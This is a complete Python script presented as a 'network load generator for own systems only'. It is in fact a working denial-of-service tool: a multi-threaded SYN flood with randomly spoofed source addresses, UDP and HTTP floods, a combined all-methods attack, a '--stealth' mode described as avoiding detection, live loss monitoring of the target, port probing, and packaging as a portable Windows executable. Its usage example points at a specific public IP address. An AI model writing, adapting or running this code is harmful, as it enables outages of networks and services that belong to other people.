#!/usr/bin/env python3
"""stress v5 — high-throughput network load gen. Own systems only."""

import sys, os, time, socket, struct, random, threading, subprocess
from datetime import datetime

VERSION = "v5.0"
IS_WIN = sys.platform.startswith("win")


# ---------------------------------------------------------------------------
# Packet factory — pre-built SYN buffer, thread-safe
# ---------------------------------------------------------------------------
class SynFactory:
    def __init__(self, target: str, batch: int = 8192):
        self.dip = socket.inet_aton(target)
        self.batch = batch
        self._buf = []
        self._lock = threading.RLock()
        self._refill()

    @staticmethod
    def _cksum(data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack(f"!{len(data) // 2}H", data))
        s = (s >> 16) + (s & 0xFFFF)
        return (~s) & 0xFFFF

    def _build_one(self) -> bytes:
        def ri(a, b):
            return random.randint(a, b)

        saddr = socket.inet_aton(f"{ri(1, 255)}.{ri(1, 255)}.{ri(1, 255)}.{ri(1, 255)}")
        sport, dport, seq, ip_id = (
            ri(1024, 65535),
            ri(1, 65535),
            ri(0, 2**32 - 1),
            ri(0, 65535),
        )
        ip = (
            struct.pack("!BBHHHBBH", 0x45, 0, 40, ip_id, 0x4000, 64, 6, 0)
            + saddr
            + self.dip
        )
        ck = self._cksum(ip)
        ip = (
            struct.pack("!BBHHHBBH", 0x45, 0, 40, ip_id, 0x4000, 64, 6, ck)
            + saddr
            + self.dip
        )
        tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 0x50, 2, 65535, 0, 0)
        psh = struct.pack("!4s4sBBH", saddr, self.dip, 0, 6, 20)
        tcp = struct.pack(
            "!HHIIBBHHH",
            sport,
            dport,
            seq,
            0,
            0x50,
            2,
            65535,
            self._cksum(psh + tcp),
            0,
        )
        return ip + tcp

    def _refill(self):
        with self._lock:
            self._buf = [self._build_one() for _ in range(self.batch)]

    def get(self) -> bytes:
        with self._lock:
            if not self._buf:
                self._refill()
            return self._buf.pop()


# ---------------------------------------------------------------------------
# Live monitor — pings target and shows latency during attack
# ---------------------------------------------------------------------------
class LiveMonitor:
    def __init__(self, target: str):
        self.target = target
        self.latency = []
        self.running = True

    def stop(self):
        self.running = False

    def run(self):
        ping = "ping -n 1" if IS_WIN else "ping -c1 -W1"
        while self.running:
            try:
                start = time.time()
                r = subprocess.run(
                    f"{ping} {self.target}".split(), capture_output=True, timeout=2
                )
                rtt = time.time() - start
                alive = r.returncode == 0
                self.latency.append((time.time(), rtt, alive))
            except:
                pass
            time.sleep(1)

    def status_line(self) -> str:
        if not self.latency:
            return ""
        recent = [x for x in self.latency if time.time() - x[0] < 5]
        if not recent:
            return ""
        avg_rtt = sum(x[1] for x in recent) / len(recent)
        loss = sum(1 for x in recent if not x[2]) / len(recent) * 100 if recent else 0
        dropped = sum(1 for x in self.latency if not x[2])
        return f"  📡 {avg_rtt * 1000:.0f}ms  {loss:.0f}% loss  {dropped} dropped"


# ---------------------------------------------------------------------------
# SYN flood — multi-threaded, each thread has its own raw socket
# ---------------------------------------------------------------------------
def syn_flood(
    target: str,
    dur: int,
    stealth: bool = False,
    monitor: bool = False,
    limit_mbps: int = 0,
):
    log(
        f"syn{' stealth' if stealth else ''} on {target} ({dur}s)"
        + (f", limit {limit_mbps}Mbps" if limit_mbps else "")
    )
    if IS_WIN:
        log("windows: use scapy fallback — install Npcap then: pip install scapy")
        return

    try:
        # test root
        test = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        test.close()
    except PermissionError:
        log("root required — run with sudo")
        return

    n_threads = max(2, min(8, (os.cpu_count() or 4) // 2))
    batch_size = 2048
    factory = SynFactory(target, batch=n_threads * batch_size)
    stop = threading.Event()
    total_sent = [0]  # use list for mutable closure
    sent_lock = threading.Lock()
    thread_buffers = [[] for _ in range(n_threads)]
    buf_lock = threading.Lock()
    counts = [0] * n_threads

    def refill_buffers():
        """Replenish all thread-local buffers from the factory."""
        for i in range(n_threads):
            thread_buffers[i] = [factory.get() for _ in range(batch_size)]

    mon = LiveMonitor(target) if monitor else None
    if mon:
        threading.Thread(target=mon.run, daemon=True).start()

    # rate limit setup
    pkts_per_mbps = 3125  # 40-byte packets
    max_rate = limit_mbps * pkts_per_mbps if limit_mbps else 0
    throttle_interval = max(0, 1.0 / (max_rate / n_threads)) if max_rate else 0

    # pre-fill all thread buffers
    for i in range(n_threads):
        thread_buffers[i] = [factory.get() for _ in range(batch_size)]

    def worker(tid: int):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        buf = thread_buffers[tid]
        end = time.time() + dur
        cnt = 0
        last_send = time.time()
        while time.time() < end and not stop.is_set():
            if not buf:
                with buf_lock:
                    if thread_buffers[tid]:
                        buf = thread_buffers[tid]
                        thread_buffers[tid] = []
                    else:
                        buf = [factory.get() for _ in range(batch_size)]
            try:
                sock.sendto(buf.pop(), (target, 0))
                cnt += 1
                if stealth and cnt % max(1, int(150000 / n_threads)) == 0:
                    time.sleep(random.uniform(0.3, 1.0))
                if throttle_interval and cnt % 100 == 0:
                    elapsed = time.time() - last_send
                    if elapsed < throttle_interval * 100:
                        time.sleep(throttle_interval * 100 - elapsed)
                    last_send = time.time()
                if cnt % 1000 == 0:
                    with sent_lock:
                        total_sent[0] += 1000
            except OSError:
                pass
        counts[tid] = cnt
        sock.close()

    threads = [
        threading.Thread(target=worker, args=(i,), daemon=True)
        for i in range(n_threads)
    ]
    log(f"launching {n_threads} syn threads")
    for t in threads:
        t.start()

    start = time.time()
    last_t, last_rpt = 0, time.time()
    while any(t.is_alive() for t in threads):
        time.sleep(0.5)
        with sent_lock:
            total = total_sent[0]
        now = time.time()
        if now - last_rpt >= 1:
            rate = (total - last_t) / (now - last_rpt)
            line = f"  {nowstr()}  {total:>9} pkts  {rate:>6.0f}/s"
            if mon:
                line += mon.status_line()
            print(line, flush=True)
            last_t, last_rpt = total, now

    for t in threads:
        t.join(timeout=1)
    if mon:
        mon.stop()
    with sent_lock:
        final = total_sent[0]
    elapsed = time.time() - start
    log(f"done — {final:,} pkts ({final / elapsed:,.0f}/s)")


# ---------------------------------------------------------------------------
# UDP flood — multiprocessing (works in forkserver)
# ---------------------------------------------------------------------------
def _udp_worker(target, dur, wid, q):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        return
    payloads = [os.urandom(s) for s in (64, 256, 512, 1024, 1400)]
    ports = [53, 80, 123, 161, 443, 5000, 8080]
    end = time.time() + dur
    cnt = 0
    lr = time.time()
    while time.time() < end:
        try:
            sock.sendto(random.choice(payloads), (target, random.choice(ports)))
            cnt += 1
        except:
            pass
        if time.time() - lr >= 2:
            q.put(("p", wid, cnt))
            lr = time.time()
    q.put(("d", wid, cnt))
    sock.close()


def _run_workers(target, dur, fn, label, min_w=2):
    import multiprocessing, queue

    cores = os.cpu_count() or 4
    n = max(min_w, cores // 2)
    log(f"launching {n} {label} workers")
    q = multiprocessing.Queue()
    procs = [
        multiprocessing.Process(target=fn, args=(target, dur, i, q)) for i in range(n)
    ]
    for p in procs:
        p.start()
    start = time.time()
    totals = [0] * n
    last_t = 0
    lr = time.time()
    while any(p.is_alive() for p in procs):
        try:
            m = q.get(timeout=0.3)
            if m[0] in ("p", "d"):
                totals[m[1]] = m[2]
        except:
            pass
        now = time.time()
        if now - lr >= 1:
            t = sum(totals)
            r = (t - last_t) / (now - lr)
            print(f"  {nowstr()}  {t:>9} pkts  {r:>6.0f}/s", flush=True)
            last_t, lr = t, now
    for p in procs:
        p.join()
    t = sum(totals)
    log(f"done — {t:,} pkts ({t / (time.time() - start):,.0f}/s)")


def udp_flood(target, dur, workers=0):
    _run_workers(target, dur, _udp_worker, "udp")


# ---------------------------------------------------------------------------
# HTTP flood — multiprocessing
# ---------------------------------------------------------------------------
def _http_worker(target, dur, wid, q):
    req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: stress/5\r\nConnection: close\r\n\r\n".encode()
    end = time.time() + dur
    cnt = 0
    lr = time.time()
    while time.time() < end:
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((target, 80))
            s.sendall(req)
            s.recv(256)
            s.close()
            cnt += 1
        except:
            pass
        if time.time() - lr >= 2:
            q.put(("p", wid, cnt))
            lr = time.time()
    q.put(("d", wid, cnt))


def http_flood(target, dur, workers=0):
    _run_workers(target, dur, _http_worker, "http", 4)


# ---------------------------------------------------------------------------
# All methods
# ---------------------------------------------------------------------------
def all_at_once(target, dur=30):
    import multiprocessing

    log(f"syn+udp+http on {target} ({dur}s)")
    procs = [
        multiprocessing.Process(target=syn_flood, args=(target, dur, False, False)),
        multiprocessing.Process(target=udp_flood, args=(target, dur)),
        multiprocessing.Process(target=http_flood, args=(target, dur)),
    ]
    for p in procs:
        p.start()
    for p in procs:
        p.join()
    log("all done")


# ---------------------------------------------------------------------------
# Verify
# ---------------------------------------------------------------------------
def verify(target):
    log(f"probing {target}...\n")
    r = subprocess.run(["ping", "-c2", "-W2", target], capture_output=True)
    print(f"    icmp:    {'alive' if r.returncode == 0 else 'no ping'}")
    for port in (80, 443, 22, 8080, 8443, 53):
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((target, port))
            print(f"    port {port}: open")
            s.close()
        except:
            pass


# ---------------------------------------------------------------------------
# Setup installer for Windows
# ---------------------------------------------------------------------------
def install_windows():
    """Create a self-contained .exe for Windows."""
    import subprocess, os, sys

    print("Creating Windows executable...")
    # Ensure PyInstaller is installed
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "pyinstaller"], capture_output=True
    )
    # Create .exe
    script = os.path.abspath(__file__)
    subprocess.run(
        [
            "pyinstaller",
            "--onefile",
            "--console",
            "--name",
            "stress",
            "--distpath",
            os.path.dirname(script),
            script,
        ]
    )
    exe = os.path.join(os.path.dirname(script), "stress.exe")
    if os.path.exists(exe):
        print(f"✅ Created {exe}")
        print("   Copy to any Windows machine and run.")
        print("   Requires Npcap: https://npcap.com (for raw sockets)")
    else:
        print("❌ Build failed. Install PyInstaller: pip install pyinstaller")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def log(msg):
    print(f"  [{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def nowstr():
    return datetime.now().strftime("%H:%M:%S")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print(f"\n  stress {VERSION} — network load gen", flush=True)

    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    flags = [a for a in sys.argv[1:] if a.startswith("--")]
    stealth = "--stealth" in flags or "--slow" in flags
    monitor = "--monitor" in flags or "--watch" in flags or "-m" in flags
    limit_mbps = 0
    for f in flags:
        if f.startswith("--limit="):
            try:
                limit_mbps = int(f.split("=")[1])
            except:
                pass

    if not args or "-h" in sys.argv or "--help" in sys.argv:
        print("  usage: python3 stress.py <target> <method> [duration] [flags]")
        print("  methods: syn, udp, http, all, verify")
        print("  flags:   --stealth       slow down to avoid detection")
        print("           --monitor       show live ping latency")
        print("           --limit=10      cap at 10 Mbps (save your WiFi)")
        print("           --install       build Windows .exe")
        print("  example:")
        print("    sudo python3 stress.py 217.45.28.154 syn 60 --limit=20 --monitor")
        sys.exit(0)

    if "--install" in sys.argv:
        install_windows()
        sys.exit(0)

    target = args[0]
    method = args[1].lower() if len(args) > 1 else "verify"
    dur = int(args[2]) if len(args) > 2 and args[2].isdigit() else 30

    print(f"  target:   {target}")
    print(f"  method:   {method}")
    if method != "verify":
        print(f"  duration: {dur}s")
    if stealth:
        print(f"  stealth:  on")
    if monitor:
        print(f"  monitor:  on")
    if limit_mbps:
        print(f"  limit:    {limit_mbps} Mbps")
    print()

    table = {
        "syn": lambda: syn_flood(target, dur, stealth, monitor, limit_mbps),
        "udp": lambda: udp_flood(target, dur),
        "http": lambda: http_flood(target, dur),
        "all": lambda: all_at_once(target, dur),
        "verify": lambda: verify(target),
    }
    fn = table.get(method)
    if not fn:
        print(f"  unknown: {method}")
        sys.exit(1)
    fn()
    print()
